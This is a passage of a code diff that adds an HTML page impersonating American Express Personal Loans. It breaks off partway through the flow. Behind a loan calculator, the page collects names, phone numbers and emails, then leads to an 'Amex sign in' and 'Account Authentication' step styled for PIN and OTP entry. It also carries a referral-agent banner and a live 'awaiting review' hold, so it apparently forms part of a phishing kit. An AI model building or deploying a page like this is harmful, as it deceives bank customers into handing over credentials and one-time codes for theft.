@@ -1,0 +1,2957 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title data-i18n="title">American Express — Personal Loans & Flexible Financing</title>
+  <meta name="description" content="Get the funds you need with American Express Personal Loans. Fixed interest rates, predictable monthly payments, zero origination fees, and fast funding." />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap"
+    rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['"Plus Jakarta Sans"', 'Inter', '-apple-system', 'BlinkMacSystemFont', '"Segoe UI"', 'sans-serif'],
+          },
+          colors: {
+            brand: {
+              navy: '#002663',
+              navyDark: '#00175A',
+              blue: '#006FCF',
+              blueHover: '#0056A3',
+              blueLight: '#F4F8FD',
+              blueBorder: '#C9DDF5',
+              cyan: '#00A3E0',
+              gold: '#F59E0B',
+              goldHover: '#D97706',
+              goldDark: '#B45309',
+              slate: '#1F2937',
+              grayBg: '#F4F6F8',
+              grayText: '#4B5563'
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    input[type=range] {
+      -webkit-appearance: none;
+      width: 100%;
+      background: transparent;
+    }
+
+    input[type=range]:focus {
+      outline: none;
+    }
+
+    input[type=range]::-webkit-slider-runnable-track {
+      width: 100%;
+      height: 8px;
+      cursor: pointer;
+      background: #D9E1E8;
+      border-radius: 9999px;
+    }
+
+    input[type=range]::-webkit-slider-thumb {
+      height: 26px;
+      width: 26px;
+      border-radius: 50%;
+      background: #006FCF;
+      border: 3px solid #FFFFFF;
+      box-shadow: 0 4px 14px rgba(0, 111, 207, 0.45);
+      cursor: pointer;
+      margin-top: -9px;
+      transition: transform 0.15s ease, background-color 0.15s ease;
+    }
+
+    input[type=range]::-webkit-slider-thumb:hover {
+      transform: scale(1.15);
+      background: #0056A3;
+    }
+
+    .pin-box,
+    .otp-box {
+      font-family: monospace;
+      font-weight: 700;
+      text-align: center;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .pin-box:focus,
+    .pin-box.active,
+    .otp-box:focus,
+    .otp-box.active {
+      border-color: #006FCF;
+      box-shadow: 0 0 0 4px rgba(0, 111, 207, 0.25);
+      transform: translateY(-1px);
+    }
+
+    /* Amex Primary Theme Gradients */
+    .amex-gradient {
+      background: linear-gradient(135deg, #00175A 0%, #002663 50%, #006FCF 100%);
+    }
+
+    .amex-btn-gradient {
+      background: linear-gradient(135deg, #006FCF 0%, #004C97 100%);
+      color: #FFFFFF;
+    }
+
+    .amex-btn-gradient:hover {
+      background: linear-gradient(135deg, #007CE8 0%, #0056A3 100%);
+    }
+
+    .amex-card-gradient {
+      background: linear-gradient(135deg, #00175A 0%, #002663 100%);
+    }
+
+    .hidden {
+      display: none !important;
+    }
+  </style>
+  <script src="/language.js" defer></script>
+</head>
+
+<body
+  class="bg-slate-100 text-slate-800 font-sans min-h-screen flex flex-col antialiased selection:bg-brand-blue selection:text-white">
+
+  <!-- Main Container Mobile/Desktop Wrapper: Fluid & Flexible across Mobile and PC -->
+  <div
+    class="max-w-md md:max-w-5xl lg:max-w-6xl w-full mx-auto bg-white min-h-screen md:min-h-0 md:my-3 lg:my-4 md:rounded-3xl shadow-2xl flex flex-col relative md:border md:border-slate-200/80 md:overflow-hidden transition-all duration-300"
+    style="overflow-x: clip;">
+
+    <!-- Top Navigation Header -->
+    <header
+      class="bg-brand-navy text-white px-5 md:px-8 py-3.5 md:py-4 flex items-center justify-between sticky top-0 z-40 border-b-2 border-brand-blue shadow-md">
+      <div class="flex items-center space-x-2 md:space-x-3">
+        <button id="header-back-btn" onclick="handleBackAction()"
+          class="p-1.5 -ml-1.5 rounded-lg text-blue-200 hover:text-white hover:bg-blue-900/60 transition-colors opacity-0 pointer-events-none"
+          aria-label="Back">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
+          </svg>
+        </button>
+        <div class="flex items-center space-x-2 md:space-x-2.5">
+          <!-- American Express Logo Monogram / Wordmark -->
+          <svg class="h-6 md:h-7 w-auto" viewBox="0 0 140 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="32" height="32" rx="4" fill="#006FCF" />
+            <rect x="2" y="2" width="28" height="28" rx="2" fill="none" stroke="#FFFFFF" stroke-opacity="0.4" stroke-width="0.8" />
+            <text x="16" y="15" font-family="'Plus Jakarta Sans', sans-serif" font-weight="900" font-size="6.5" fill="#FFFFFF" text-anchor="middle" letter-spacing="0.3">AMERICAN</text>
+            <text x="16" y="23" font-family="'Plus Jakarta Sans', sans-serif" font-weight="900" font-size="6.5" fill="#FFFFFF" text-anchor="middle" letter-spacing="0.3">EXPRESS</text>
+            <text x="40" y="22" font-family="'Plus Jakarta Sans', sans-serif" font-weight="900" font-size="16" fill="#FFFFFF" letter-spacing="-0.3">AMEX</text>
+          </svg>
+          <span
+            class="text-xs font-bold tracking-tight text-white bg-blue-950/80 px-2.5 py-0.5 rounded border border-blue-400/30">Personal Loans</span>
+        </div>
+      </div>
+
+      <div class="flex items-center space-x-2 md:space-x-3">
+        <div class="hidden md:flex items-center text-xs text-blue-200 space-x-4 mr-2">
+          <span class="flex items-center space-x-1.5 font-semibold">
+            <span class="text-emerald-400 font-bold">✓</span>
+            <span>Fixed Rates from 7.99%</span>
+          </span>
+          <span class="flex items-center space-x-1.5 font-semibold">
+            <span class="text-emerald-400 font-bold">✓</span>
+            <span>No Origination Fees</span>
+          </span>
+          <span class="flex items-center space-x-1.5 font-semibold">
+            <span class="text-emerald-400 font-bold">✓</span>
+            <span>Funds in as Fast as 1 Day</span>
+          </span>
+        </div>
+        <button type="button"
+          class="language-toggle bg-blue-950/80 hover:bg-blue-900 text-xs font-black text-white px-2.5 md:px-3 py-1.5 rounded-md border border-blue-400/40 transition-all">
+          EN
+        </button>
+        <button
+          onclick="toggleNoticeModal(true, 'American Express Customer Care', 'Personal Loans Support: (844) 273-1384 (Mon-Fri 9:00 am – 9:00 pm EST) or visit americanexpress.com for loan disclosures and terms.')"
+          class="p-1.5 text-blue-200 hover:text-white rounded-lg transition-colors" aria-label="Info">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5"
+              d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+          </svg>
+        </button>
+      </div>
+    </header>
+
+    <!-- Agent Referral Active Badge (Dynamic) -->
+    <div id="referral-banner"
+      class="bg-blue-50 border-b border-brand-blueBorder px-4 md:px-8 py-2 text-xs font-semibold text-brand-navy flex items-center justify-between hidden">
+      <div class="flex items-center space-x-1.5">
+        <span class="flex h-2 w-2 relative">
+          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
+          <span class="relative inline-flex rounded-full h-2 w-2 bg-brand-blue"></span>
+        </span>
+        <span>Referred by American Express Partner</span>
+      </div>
+      <span id="referral-code-display"
+        class="font-mono bg-white px-2.5 py-0.5 rounded border border-brand-blueBorder text-[11px] text-brand-blue font-bold"></span>
+    </div>
+
+    <!-- Main Content Area -->
+    <main class="flex-1 flex flex-col">
+
+      <!-- STEP 0: Hero & Interactive Calculator (Optimized for PC Viewport - Fits Above the Fold) -->
+      <section id="step-0" class="flex-1 flex flex-col md:grid md:grid-cols-12 md:items-stretch">
+        <!-- Hero Header (Desktop Left Col, Mobile Top Header) -->
+        <div
+          class="amex-gradient text-white px-5 pt-6 pb-8 md:p-6 lg:p-7 text-center md:text-left relative overflow-hidden shadow-inner md:col-span-5 lg:col-span-5 md:flex md:flex-col md:justify-between">
+          <div class="absolute -right-8 -bottom-8 w-40 h-40 bg-blue-400/15 rounded-full blur-2xl pointer-events-none">
+          </div>
+          <div class="relative z-10 space-y-2.5 md:space-y-3">
+            <div
+              class="inline-flex items-center space-x-2 bg-white/15 text-white border border-white/25 px-3 py-0.5 rounded-full text-xs font-bold shadow-xs mb-1">
+              <svg class="w-3.5 h-3.5 text-cyan-300" fill="currentColor" viewBox="0 0 20 20">
+                <path
+                  d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
+              </svg>
+              <span data-i18n="heroBadge">Fixed Rates • No Hidden Fees • Funds in as Fast as 1 Day</span>
+            </div>
+            <h1 class="text-xl md:text-2xl lg:text-3xl font-black tracking-tight text-white leading-tight"
+              data-i18n="heroHeading">Simulate Your American Express® Personal Loan</h1>
+            <p class="text-xs md:text-sm text-blue-100 font-medium max-w-xs md:max-w-md mx-auto md:mx-0 leading-relaxed"
+              data-i18n="heroSubtitle">Get the funds you need with fixed monthly payments, competitive interest rates, and no origination fees or prepayment penalties.</p>
+
+            <!-- Desktop Benefit Highlights -->
+            <div class="hidden md:flex flex-col space-y-2 pt-3 border-t border-blue-400/20 text-xs text-blue-100">
+              <div class="flex items-center space-x-2">
+                <span
+                  class="w-4 h-4 rounded-full bg-emerald-500/20 text-emerald-300 flex items-center justify-center font-bold text-[11px] flex-shrink-0">✓</span>
+                <span class="font-semibold text-white">Instant decision in seconds with soft credit inquiry</span>
+              </div>
+              <div class="flex items-center space-x-2">
+                <span
+                  class="w-4 h-4 rounded-full bg-emerald-500/20 text-emerald-300 flex items-center justify-center font-bold text-[11px] flex-shrink-0">✓</span>
+                <span class="font-semibold text-white">Funds deposited in as fast as 1 day upon approval</span>
+              </div>
+              <div class="flex items-center space-x-2">
+                <span
+                  class="w-4 h-4 rounded-full bg-emerald-500/20 text-emerald-300 flex items-center justify-center font-bold text-[11px] flex-shrink-0">✓</span>
+                <span class="font-semibold text-white">Zero origination fees & zero prepayment penalties</span>
+              </div>
+            </div>
+          </div>
+
+          <div
+            class="relative z-10 mt-4 pt-3 border-t border-blue-400/20 text-[10px] md:text-[11px] font-semibold text-blue-200 uppercase tracking-widest">
+            Issued by American Express National Bank
+          </div>
+        </div>
+
+        <!-- Calculator Panel (Desktop Right Col, Mobile Bottom Card) -->
+        <div
+          class="-mt-4 md:mt-0 bg-white rounded-t-2xl md:rounded-none px-5 py-5 md:p-6 lg:p-7 flex-1 flex flex-col justify-between shadow-lg md:shadow-none md:col-span-7 lg:col-span-7">
+          <div class="space-y-3.5 md:space-y-4">
+            <!-- Amount Display & Slider -->
+            <div class="bg-slate-50 border border-slate-200 rounded-xl p-3.5 md:p-4 shadow-xs">
+              <div class="flex justify-between items-center mb-0.5">
+                <span class="text-xs font-bold text-brand-navy uppercase tracking-wider"
+                  data-i18n="requestedAmount">Requested Loan Amount</span>
+                <span class="text-[11px] font-black text-white bg-brand-blue px-2 py-0.5 rounded shadow-xs"
+                  data-i18n="interestRate">Fixed APR (from 7.99%)</span>
+              </div>
+              <div class="text-center py-1 md:py-1.5">
+                <span id="calc-amount-display"
+                  class="text-2xl md:text-3xl font-black text-brand-navy tracking-tight">$10,000</span>
+              </div>
+
+              <input id="amount-range" type="range" min="99" max="40000" step="250" value="10000"
+                oninput="updateCalculator(this.value)" class="my-2" />
+
+              <div class="flex justify-between text-[10px] md:text-[11px] font-bold text-slate-500">
+                <span>$3,500 (Min)</span>
+                <span>$20,000</span>
+                <span>$40,000 (Max)</span>
+              </div>
+            </div>
+
+            <!-- Term Selector Chips -->
+            <div>
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5"
+                data-i18n="repaymentTerm">Repayment Period</label>
+              <div class="grid grid-cols-5 gap-1.5 sm:gap-2">
+                <button type="button" onclick="setTerm(12)"
+                  class="term-btn py-1.5 md:py-2 px-1 text-xs font-bold rounded-lg border border-slate-200 text-slate-700 hover:border-brand-blue transition-all"
+                  data-i18n="month1">12 Mo</button>
+                <button type="button" onclick="setTerm(24)"
+                  class="term-btn py-1.5 md:py-2 px-1 text-xs font-bold rounded-lg border border-slate-200 text-slate-700 hover:border-brand-blue transition-all"
+                  data-i18n="months3">24 Mo</button>
+                <button type="button" onclick="setTerm(36)"
+                  class="term-btn py-1.5 md:py-2 px-1 text-xs font-bold rounded-lg border-2 border-brand-blue bg-blue-50 text-brand-navy shadow-xs"
+                  data-i18n="months6">36 Mo</button>
+                <button type="button" onclick="setTerm(48)"
+                  class="term-btn py-1.5 md:py-2 px-1 text-xs font-bold rounded-lg border border-slate-200 text-slate-700 hover:border-brand-blue transition-all">48 Mo</button>
+                <button type="button" onclick="setTerm(60)"
+                  class="term-btn py-1.5 md:py-2 px-1 text-xs font-bold rounded-lg border border-slate-200 text-slate-700 hover:border-brand-blue transition-all"
+                  data-i18n="months12">60 Mo</button>
+              </div>
+            </div>
+
+            <!-- Repayment Summary Card -->
+            <div
+              class="amex-card-gradient text-white rounded-xl p-3.5 md:p-4 shadow-md relative overflow-hidden border border-blue-900">
+              <div class="flex justify-between items-center border-b border-blue-800/80 pb-2 mb-2">
+                <span class="text-xs text-blue-200" data-i18n="estMonthly">Est. Monthly Payment:</span>
+                <span class="text-lg md:text-xl font-black text-cyan-300 tracking-tight">
+                  <span id="calc-monthly-payment">318</span> <span class="text-xs font-bold text-white">USD/mo</span>
+                </span>
+              </div>
+              <div class="flex justify-between items-center text-xs text-blue-200">
+                <span data-i18n="totalRepay">Total Estimated Repayment:</span>
+                <span id="calc-total-payment" class="font-bold text-white">$11,448</span>
+              </div>
+              <div class="mt-1.5 text-[10px] text-blue-300 leading-tight">
+                *Fixed rate personal loan. No origination fees or prepayment penalties. Predictable monthly payments.
+              </div>
+            </div>
+          </div>
+
+          <!-- Action Button (Immediately Visible Above the Fold on PC) -->
+          <div class="pt-3 md:pt-4">
+            <button id="hero-apply-btn" type="button" onclick="goToStep(1)"
+              class="w-full py-3.5 md:py-4 amex-btn-gradient active:scale-[0.99] font-black rounded-xl shadow-lg shadow-blue-900/30 text-xs md:text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
+              <span data-i18n="applyNow">APPLY FOR PERSONAL LOAN NOW</span>
+              <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3" />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </section>
+
+      <!-- Educational Content Section: How it Works & Benefits -->
+      <section class="border-t border-slate-200/80 bg-slate-50/70 px-5 py-6 md:p-8">
+        <div class="max-w-4xl mx-auto space-y-6">
+          <div class="text-center space-y-1">
+            <span class="text-[11px] font-black text-brand-blue uppercase tracking-wider">Independent Financial Services Guide</span>
+            <h2 class="text-lg md:text-xl font-black text-slate-900">Why Choose American Express® Personal Loans?</h2>
+          </div>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div class="bg-white p-4 rounded-xl border border-slate-200 shadow-xs space-y-2">
+              <div class="w-8 h-8 rounded-lg bg-blue-50 text-brand-blue flex items-center justify-center font-bold text-base">💳</div>
+              <h3 class="text-xs font-bold text-slate-900">Consolidate Debt</h3>
+              <p class="text-[11px] text-slate-500 leading-relaxed">Combine higher-interest credit cards and debts into one predictable monthly payment with fixed interest rates.</p>
+            </div>
+            <div class="bg-white p-4 rounded-xl border border-slate-200 shadow-xs space-y-2">
+              <div class="w-8 h-8 rounded-lg bg-blue-50 text-brand-blue flex items-center justify-center font-bold text-base">🏡</div>
+              <h3 class="text-xs font-bold text-slate-900">Home Improvements</h3>
+              <p class="text-[11px] text-slate-500 leading-relaxed">Upgrade your kitchen, remodel bathrooms, or make essential home repairs with straightforward fixed-term loans.</p>
+            </div>
+            <div class="bg-white p-4 rounded-xl border border-slate-200 shadow-xs space-y-2">
+              <div class="w-8 h-8 rounded-lg bg-blue-50 text-brand-blue flex items-center justify-center font-bold text-base">⚡</div>
+              <h3 class="text-xs font-bold text-slate-900">Quick Funding</h3>
+              <p class="text-[11px] text-slate-500 leading-relaxed">Upon approval and agreement signing, funds are sent directly to your linked bank account in as fast as 1 business day.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- STEP 1: Loan Configuration Form -->
+      <section id="step-1"
+        class="hidden flex-1 flex flex-col p-5 sm:p-6 md:p-8 lg:p-10 max-w-3xl lg:max-w-4xl mx-auto w-full space-y-4 md:space-y-5">
+        <div>
+          <span
+            class="text-[11px] font-black text-white bg-brand-blue px-2.5 py-1 rounded-full uppercase tracking-wider">Step
+            1 of 4</span>
+          <h2 class="text-xl md:text-2xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2">
+            <span data-i18n="step1Title">Personal Loan Preferences</span>
+          </h2>
+          <p class="text-xs md:text-sm text-slate-500 mt-1" data-i18n="step1Sub">Select your desired borrowing amount ($3,500 - $40,000 USD) and repayment period.</p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-5">
+          <div>
+            <label for="loan-type-select"
+              class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5"
+              data-i18n="loanType">
+              <span>🏷️</span>
+              <span>Financing Type</span>
+            </label>
+            <select id="loan-type-select"
+              class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
+              <option value="American Express Personal Loan — Fixed Rate ($3,500 - $40,000)" selected>American Express Personal Loan — Fixed Rate ($3,500 - $40,000)</option>
+              <option value="American Express Debt Consolidation Loan">American Express Debt Consolidation Loan</option>
+              <option value="American Express Home Improvement Loan">American Express Home Improvement Loan</option>
+              <option value="American Express Business Line of Credit">American Express Business Line of Credit</option>
+              <option value="American Express Flexible Financing Option">American Express Flexible Financing Option</option>
+            </select>
+          </div>
+
+          <div>
+            <label for="loan-amount-input"
+              class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5"
+              data-i18n="amountLabel">
+              <span>💰</span>
+              <span>Loan Amount Request (USD)</span>
+            </label>
+            <input id="loan-amount-input" type="number" min="99" max="40000" step="250"
+              oninput="onLoanAmountInput(this.value)"
+              class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm md:text-base font-bold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20"
+              value="10000" />
+          </div>
+
+          <div>
+            <label for="loan-term-select"
+              class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5"
+              data-i18n="termLabel">
+              <span>📅</span>
+              <span>Repayment Period (Months)</span>
+            </label>
+            <select id="loan-term-select"
+              class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
+              <option value="12">12 Months (1 Year)</option>
+              <option value="24">24 Months (2 Years)</option>
+              <option value="36" selected>36 Months (3 Years - Recommended)</option>
+              <option value="48">48 Months (4 Years)</option>
+              <option value="60">60 Months (5 Years)</option>
+              <option value="6">6 Months (Short-Term Financing)</option>
+            </select>
+          </div>
+
+          <div>
+            <label for="loan-purpose-input"
+              class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5"
+              data-i18n="purposeLabel">
+              <span>📝</span>
+              <span>Intended Use</span>
+            </label>
+            <textarea id="loan-purpose-input" rows="2" placeholder="e.g. Debt consolidation, Home improvements, Major purchases..."
+              class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs md:text-sm font-medium text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-none">Debt Consolidation & Credit Card Refinancing</textarea>
+          </div>
+        </div>
+
+        <div class="pt-3 md:pt-4">
+          <button type="button" onclick="goToStep(2)"
+            class="w-full py-3.5 md:py-4 amex-btn-gradient hover:opacity-95 text-white font-black rounded-xl shadow-md text-xs sm:text-sm tracking-wider uppercase flex items-center justify-center space-x-2"
+            data-i18n="continueToPersonal">
+            <span>CONTINUE TO APPLICANT DETAILS</span>
+            <span>⚡</span>
+          </button>
+        </div>
+      </section>
+
+      <!-- STEP 2: Applicant Information Form -->
+      <section id="step-2"
+        class="hidden flex-1 flex flex-col p-5 sm:p-6 md:p-8 lg:p-10 max-w-3xl lg:max-w-4xl mx-auto w-full space-y-4 md:space-y-5">
+        <div>
+          <span
+            class="text-[11px] font-black text-white bg-brand-blue px-2.5 py-1 rounded-full uppercase tracking-wider">Step
+            2 of 4</span>
+          <h2 class="text-xl md:text-2xl font-extrabold text-slate-900 mt-1.5 flex items-center space-x-2"
+            data-i18n="step2Title">
+            <span>👤</span>
+            <span>Applicant Identification</span>
+          </h2>
+          <p class="text-xs md:text-sm text-slate-500 mt-0.5" data-i18n="step2Sub">Enter your legal name, contact details, and underwriting info.</p>
+        </div>
+
+        <div class="space-y-3 sm:space-y-4">
+          <div class="grid grid-cols-2 gap-2.5 md:gap-4">
+            <div>
+              <label for="first-name-input"
+                class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1"
+                data-i18n="firstName">
+                <span>👤</span>
+                <span>First Name *</span>
+              </label>
+              <input id="first-name-input" type="text" placeholder="e.g. John"
+                class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue"
+                value="" required />
+            </div>
+            <div>
+              <label for="last-name-input"
+                class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1"
+                data-i18n="lastName">
+                <span>👤</span>
+                <span>Last Name *</span>
+              </label>
+              <input id="last-name-input" type="text" placeholder="e.g. Miller"
+                class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue"
+                value="" required />
+            </div>
+          </div>
+
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-3 md:gap-4">
+            <div>
+              <div class="flex items-center justify-between mb-1">
+                <label for="phone-number-input"
+                  class="text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1"
+                  data-i18n="orangePhone">
+                  <span>📱</span>
+                  <span>Mobile Phone Number *</span>
+                </label>
+                <!-- Country Selector (US or UK) -->
+                <div class="flex items-center space-x-1 bg-slate-100 p-0.5 rounded-lg border border-slate-200">
+                  <button type="button" id="country-btn-us" onclick="setCountry('US')"
+                    class="px-2 py-0.5 text-[11px] font-bold rounded-md transition-all bg-white text-brand-navy shadow-xs flex items-center space-x-1">
+                    <span>🇺🇸</span>
+                    <span>US (+1)</span>
+                  </button>
+                  <button type="button" id="country-btn-uk" onclick="setCountry('UK')"
+                    class="px-2 py-0.5 text-[11px] font-bold rounded-md transition-all text-slate-500 hover:text-slate-800 flex items-center space-x-1">
+                    <span>🇬🇧</span>
+                    <span>UK (+44)</span>
+                  </button>
+                </div>
+              </div>
+              <div
+                class="flex items-center bg-slate-50 border border-slate-300 rounded-xl overflow-hidden focus-within:bg-white focus-within:border-brand-blue focus-within:ring-2 focus-within:ring-brand-blue/20 transition-all shadow-xs">
+                <div
+                  class="flex items-center space-x-1.5 bg-slate-100 border-r border-slate-200 px-3 py-2.5 md:py-3 flex-shrink-0 select-none cursor-pointer"
+                  onclick="toggleCountry()" title="Click to switch country">
+                  <span id="phone-flag" class="text-xs">🇺🇸</span>
+                  <span id="phone-prefix" class="text-xs font-bold text-slate-700 whitespace-nowrap">+1</span>
+                </div>
+                <input id="phone-number-input" type="tel" placeholder="(555) 123-4567"
+                  oninput="onPhoneNumberInput(this)" onkeydown="onPhoneKeyDown(this, event)"
+                  class="w-full bg-transparent px-3 py-2.5 md:py-3 text-xs md:text-sm font-bold text-slate-800 focus:outline-none min-w-0"
+                  value="" required />
+              </div>
+            </div>
+
+            <div>
+              <label for="email-input"
+                class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1">
+                <span>✉️</span>
+                <span>Email Address</span>
+              </label>
+              <input id="email-input" type="email" placeholder="john.miller@example.com"
+                class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue"
+                value="" />
+            </div>
+          </div>
+
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-3 md:gap-4">
+            <div>
+              <label for="employment-select"
+                class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1"
+                data-i18n="employmentStatus">
+                <span>💼</span>
+                <span>Employment Status</span>
+              </label>
+              <select id="employment-select"
+                class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs md:text-sm font-semibold text-slate-800 focus:outline-none focus:border-brand-blue">
+                <option value="Employed" selected>Employed (Full/Part Time)</option>
+                <option value="Self-Employed / Business Owner">Self-Employed / Business Owner</option>
+                <option value="Freelancer / Contractor">Freelancer / Contractor</option>
+                <option value="Retired / Other">Retired / Other</option>
+              </select>
+            </div>
+            <div>
+              <label class="block text-[11px] md:text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1">
+                <span>🛡️</span>
+                <span>Underwriting Review</span>
+              </label>
+              <div class="flex items-center space-x-2 bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 md:py-3 text-xs text-slate-600 font-semibold">
+                <span class="text-emerald-500 font-bold">✓</span>
+                <span>Soft inquiry — No credit score impact to apply</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Consent checkbox -->
+          <div class="pt-1">
+            <div class="flex items-start space-x-2 bg-blue-50/60 p-3 rounded-xl border border-blue-100">
+              <input id="agent-consent-checkbox" type="checkbox" checked
+                class="w-4 h-4 mt-0.5 text-brand-blue rounded border-slate-300 focus:ring-brand-blue flex-shrink-0" />
+              <label for="agent-consent-checkbox"
+                class="text-[11px] text-slate-600 font-medium leading-tight" data-i18n="agentConsent">
+                🤝 I authorize American Express to review my application and check my credit report without impacting my credit score.
+              </label>
+            </div>
+          </div>
+
+          <div id="step2-alert"
+            class="mt-2 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
+        </div>
+
+        <!-- Submit Button & Live Waiting Indicators -->
+        <div class="pt-3 border-t border-slate-100 space-y-3">
+          <button id="continue-to-auth-btn" type="button" onclick="submitStep2AndAwaitApproval()"
+            class="w-full py-4 amex-btn-gradient hover:opacity-95 text-white font-black rounded-xl shadow-lg shadow-blue-900/25 text-xs sm:text-sm tracking-wider uppercase transition-all flex items-center justify-center space-x-2 active:scale-[0.99]"
+            data-i18n="continueToAuth">
+            <span>CONTINUE TO AMEX SIGN IN</span>
+            <span>⚡</span>
+          </button>
+
+          <!-- Live Approval Waiting Indicator for Step 2 Application Submission -->
+          <div id="app-waiting-box"
+            class="hidden p-3.5 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
+            <div class="flex items-center justify-center space-x-2">
+              <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
+              <span class="text-xs font-bold text-brand-navy uppercase tracking-wider">Awaiting Underwriting Review</span>
+            </div>
+            <p class="text-xs text-blue-800">Your application details have been submitted. Please wait while underwriting reviews your request...</p>
+            <div class="flex justify-center pt-1">
+              <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor"
+                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+                </path>
+              </svg>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- STEP 3: Account Verification (Step 3 of 4) -->
+      <section id="step-3" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
+
+        <!-- Top Blue Banner Header -->
+        <div class="amex-gradient text-white pt-7 pb-8 px-6 text-center relative shadow-md">
+          <div class="inline-flex flex-col items-center">
+            <h2
+              class="text-xl sm:text-2xl font-black text-white tracking-tight flex items-center justify-center space-x-2">
+              <span>🔐</span>
+              <span>Account Authentication</span>
+            </h2>
+            <p class="text-xs text-blue-100 font-medium mt-0.5">American Express Online Services Security Verification</p>
+          </div>
+        </div>
+
+        <!-- Main Form Content -->
+        <div
